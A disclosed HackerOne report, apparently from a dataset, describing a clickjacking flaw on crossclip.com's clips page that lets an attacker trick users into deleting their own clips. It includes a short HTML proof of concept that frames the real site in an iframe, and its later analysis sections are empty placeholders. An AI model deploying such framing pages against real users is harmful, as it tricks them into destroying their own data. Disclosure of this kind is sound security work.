---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1294767'
original_report_id: '1294767'
title: clickjacking on deleting user's clips [https://crossclip.com/clips]
weakness: UI Redressing (Clickjacking)
team_handle: logitech
created_at: '2021-08-08T00:02:21.557Z'
disclosed_at: '2021-11-05T20:39:29.102Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
asset_identifier: '*.crossclip.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- ui-redressing-clickjacking
---

# clickjacking on deleting user's clips [https://crossclip.com/clips]

## Metadata

- HackerOne Report ID: 1294767
- Weakness: UI Redressing (Clickjacking)
- Program: logitech
- Disclosed At: 2021-11-05T20:39:29.102Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
An attacker can trick  victim to delete his own clips on https://crossclip.com/clips.
## Steps To Reproduce:
{F1403810}
  1. Login
  1. Create an HTML file with the following code.
```
<html lang="en-US">
<head>
<meta charset="UTF-8">
<title>I-Frame</title>
</head>
<body>
<center><h1>THIS PAGE IS VULNERABLE TO CLICKJACKING</h1>

<iframe src="https://crossclip.com/clips" frameborder="0 px" height="1200px" width="1920px"></iframe>
</center>
</body>
</html>

```
  

## Supporting Material/References:
{F1403810}

## Impact

tricking user to delete his own clips

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
